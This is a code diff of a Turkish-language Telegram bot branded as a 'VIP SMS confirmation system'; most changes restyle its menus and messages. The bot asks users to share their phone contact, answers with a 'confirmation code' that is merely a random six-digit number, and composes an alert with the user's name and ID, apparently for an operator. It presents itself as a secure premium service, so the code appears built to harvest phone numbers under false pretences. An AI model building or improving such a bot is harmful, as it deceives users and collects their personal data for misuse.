@@ -24,9 +24,8 @@ def save_bans():
 
 def main_menu():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🚀 SMS İşlemi Başlat", callback_data="sms")],
-        [InlineKeyboardButton("👑 Hesabım & Bilgilerim", callback_data="profil")],
-        [InlineKeyboardButton("🛠 Destek Merkezi", callback_data="yardim")]
+        [InlineKeyboardButton("🚀 SMS ONAY BAŞLAT", callback_data="sms")],
+        [InlineKeyboardButton("👑 HESABIM", callback_data="profil")]
     ])
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -36,19 +35,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     text = f"""
 ╔══════════════════════╗
-🌟  WELCOME TO VIP SMS SYSTEM  🌟
+🌟   VIP SMS ONAY SİSTEMİ   🌟
 ╚══════════════════════╝
 
-👤 Kullanıcı: {user.first_name}
-🆔 ID: {user.id}
+👤 {user.first_name}
+🆔 {user.id}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-💎 Premium SMS Onay Hizmeti
-⚡ Yüksek Hızlı Sistem
-🔒 Güvenli & Otomatik İşlem
+⚡ Anında SMS Onay
+🔒 Güvenli İşlem
+💎 Premium Sistem
 ━━━━━━━━━━━━━━━━━━━━━━
 
-⬇️ Devam etmek için bir işlem seç
+⬇️ İşlem seç
 """
 
     await update.message.reply_text(text, reply_markup=main_menu())
@@ -62,34 +61,27 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if query.data == "sms":
         waiting_number.add(user.id)
-        btn = KeyboardButton("📲 Numara Gönder", request_contact=True)
+        btn = KeyboardButton("📲 NUMARA GÖNDER", request_contact=True)
         kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
-        await query.message.reply_text("📞 Telefon numaranı paylaşarak işleme devam et", reply_markup=kb)
+
+        await query.message.reply_text("""
+╔══════════════╗
+📡 SMS ONAY
+╚══════════════╝
+
+Numaranı gönder
+""", reply_markup=kb)
 
     elif query.data == "profil":
-        await query.message.reply_text(
-            f"""
-👑 HESAP BİLGİLERİN
+        await query.message.reply_text(f"""
+╔══════════════╗
+👑 HESABIM
+╚══════════════╝
 
 🆔 ID: {user.id}
-👤 Ad: {user.first_name}
-
-💎 VIP Kullanıcı
-"""
-        )
-
-    elif query.data == "yardim":
-        await query.message.reply_text(
-            """
-🛠 DESTEK MERKEZİ
-
-1️⃣ SMS İşlemi Başlat butonuna bas
-2️⃣ Numaranı gönder
-3️⃣ Onay kodunu anında al
-
-Sorun yaşarsan admin ile iletişime geç.
-"""
-        )
+👤 İsim: {user.first_name}
+💎 Durum: VIP
+""")
 
 async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -104,10 +96,16 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     code = random.randint(100000, 999999)
     time = datetime.now(ZoneInfo("Europe/Istanbul")).strftime("%d.%m.%Y %H:%M:%S")
 
-    await update.message.reply_text(f"✅ Onay Kodun: {code}")
+    await update.message.reply_text(f"""
+╔══════════════╗
+✅ SMS ONAY
+╚══════════════╝
+
+🔢 {code}
+""")
 
     text = f"""
-🚨 Yeni SMS Onay
+🚨 YENİ SMS ONAY
 
 👤 Kullanıcı: {user.first_name}
 🆔 ID: {user.id}
